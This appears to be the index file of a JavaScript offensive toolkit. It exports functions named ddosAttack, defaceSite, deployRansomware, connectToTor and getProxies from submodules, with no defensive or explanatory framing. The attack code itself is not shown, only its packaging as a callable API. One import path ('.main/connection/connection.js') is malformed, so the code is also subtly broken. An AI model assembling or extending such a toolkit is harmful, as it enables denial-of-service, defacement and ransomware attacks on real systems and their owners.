const ddos = require('./main/ddos/ddos.js');
const deface = require('./main/deface/deface.js');
const tor = require('./main/tor/tor.js');
const ransomware = require('./main/ransomware/ransomware.js');
const connection = require('.main/connection/connection.js');
const proxy = require('./main/proxy/proxy.js');

module.exports = {
    ddosAttack: ddos.ddosAttack,
    defaceSite: deface.defaceSite,
    connectToTor: tor.connectToTor,
    deployRansomware: ransomware.deployRansomware,
    establishConnection: connection.establishConnection,
    getProxies: proxy.getProxies
};
